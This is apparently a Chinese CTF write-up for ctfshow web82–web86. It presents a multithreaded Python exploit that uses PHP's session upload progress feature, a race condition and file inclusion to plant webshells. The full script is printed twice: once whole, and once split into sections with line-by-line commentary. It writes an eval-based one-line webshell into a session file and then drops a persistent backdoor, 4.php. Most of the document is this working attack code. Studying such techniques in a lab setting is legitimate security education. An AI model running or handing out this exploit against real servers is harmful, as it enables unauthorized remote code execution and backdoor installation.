# PHP Session Upload Progress + 条件竞争 利用脚本

PHP Session Upload Progress + 条件竞争 利用脚本

这个脚本源自于ctfshow中其他师傅的wp+AI优化，功能比较强大，web86-web82一把梭

## 脚本内容

```Python
import requests
import io
import threading
import urllib3

# === 关键：关闭 SSL 警告 ===
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://bb96a81f-7108-49e2-b486-07779d862beb.challenge.ctf.show/'
sessionid = 'gengar'
cookies = {'PHPSESSID': sessionid}
stop_event = threading.Event()


def write():
    while not stop_event.is_set():
        try:
            with requests.Session() as s:
                data = {'PHP_SESSION_UPLOAD_PROGRESS': '<?=eval($_POST[1])?>'}
                files = {'file': ('truthahn.jpg', io.BytesIO(b'a' * 51200))}
                # ✅ 必须加 verify=False
                s.post(url, data=data, cookies=cookies, files=files, verify=False, timeout=5)
        except Exception as e:
            pass  # 忽略网络错误


def read():
    while not stop_event.is_set():
        try:
            with requests.Session() as s:
                payload = "file_put_contents('4.php','<?=eval($_POST[2]);?>');"
                # ✅ 包含 session 时也要 verify=False
                s.post(
                    url + f'?file=/tmp/sess_{sessionid}',
                    data={'1': payload},
                    cookies=cookies,
                    verify=False,
                    timeout=5
                )
                # ✅ 检查文件时也要 verify=False
                resp = s.get(url + '4.php', verify=False, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] SUCCESS! Shell at: {url}4.php")
                    stop_event.set()
                    return
                else: print("defeat")
        except Exception as e:
            pass


if __name__ == '__main__':
    # 启动 5 个写线程
    for _ in range(5):
        t = threading.Thread(target=write, daemon=True)
        t.start()

    # 启动 5 个读线程
    for _ in range(5):
        t = threading.Thread(target=read, daemon=True)
        t.start()

    # 主线程等待成功或手动中断
    try:
        while not stop_event.is_set():
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n[-] Stopped by user")
```

## 代码块分析

### 1.模块导入与变量定义

```Python
import requests
import io
import threading
import urllib3

# === 关键：关闭 SSL 警告 ===
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://bb96a81f-7108-49e2-b486-07779d862beb.challenge.ctf.show/'
sessionid = 'gengar'
cookies = {'PHPSESSID': sessionid}
stop_event = threading.Event()
```

- urllib3.disable_warnings(...)：关闭 SSL 证书验证警告（因为目标用了 HTTPS 但是为自签名证书）
- sessionid：固定会话 ID，确保上传进度和读取指向同一个 session 文件
- PHPSESSID：PHP 默认的会话（Session）Cookie 名称，用于在客户端和服务器之间传递会话 ID，从而维持用户状态
- stop_event：线程同步信号，一旦成功写入 Webshell，立即停止所有线程

### 2.写入函数

```Python
def write():
    while not stop_event.is_set():
        try:
            with requests.Session() as s:
                data = {'PHP_SESSION_UPLOAD_PROGRESS': '<?=eval($_POST[1])?>'}
                files = {'file': ('truthahn.jpg', io.BytesIO(b'a' * 51200))}
                # ✅ 必须加 verify=False
                s.post(url, data=data, cookies=cookies, files=files, verify=False, timeout=5)
        except Exception as e:
            pass  # 忽略网络错误
```

- while not stop_event.is_set()：线程同步信号没有被触发
- data：将一句话木马通过 PHP 的 Session Upload Progress 特性进行 Webshell 注入，该内容会被写入/tmp/sess_{sessionid}
- files：模拟文件上传，因为需要同时上传一个文件（multipart/form-data)才能触发触发 PHP 的 `session.upload_progress` 特性，PHP 会自动将PHP_SESSION_UPLOAD_PROGRESS的值写入当前用户的 session 文件
- s.post：
  - 设置 timeout=5，防止线程永久阻塞，高频、快速的请求循环高条件竞争成功率
  - 设置 verify=False，禁用 SSL/TLS 证书验证

### 3.读取函数

```Python
def read():
    while not stop_event.is_set():
        try:
            with requests.Session() as s:
                payload = "file_put_contents('4.php','<?=eval($_POST[2]);?>');"
                # ✅ 包含 session 时也要 verify=False
                s.post(
                    url + f'?file=/tmp/sess_{sessionid}',
                    data={'1': payload},
                    cookies=cookies,
                    verify=False,
                    timeout=5
                )
                # ✅ 检查文件时也要 verify=False
                resp = s.get(url + '4.php', verify=False, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] SUCCESS! Shell at: {url}4.php")
                    stop_event.set()
                    return
                else: print("defeat")
        except Exception as e:
            pass
```

- payload：一句话木马写入4.php
- s.post：访问/tmp/sess_{sessionid}，post二次写入文件，建立后门
- s.get：检查文件是否写入成功
- stop_event.set()：文件写入成功，线程同步信号stop，用于结束程序

### 4.启动线程

```Python
# 启动 5 个写线程
for _ in range(5):
    t = threading.Thread(target=write, daemon=True)
    t.start()

# 启动 5 个读线程
for _ in range(5):
    t = threading.Thread(target=read, daemon=True)
    t.start()
```

- target：线程要运行的任务

## 5.等待循环

```Python
try:
    while not stop_event.is_set():
        threading.Event().wait(1)
except KeyboardInterrupt:
    print("\n[-] Stopped by user")
```

让主线程休眠 1 秒（threading.Event().wait(1)）的核心目的是：避免主线程以“空循环”方式疯狂占用 CPU 资源，同时保持对程序状态的定期检查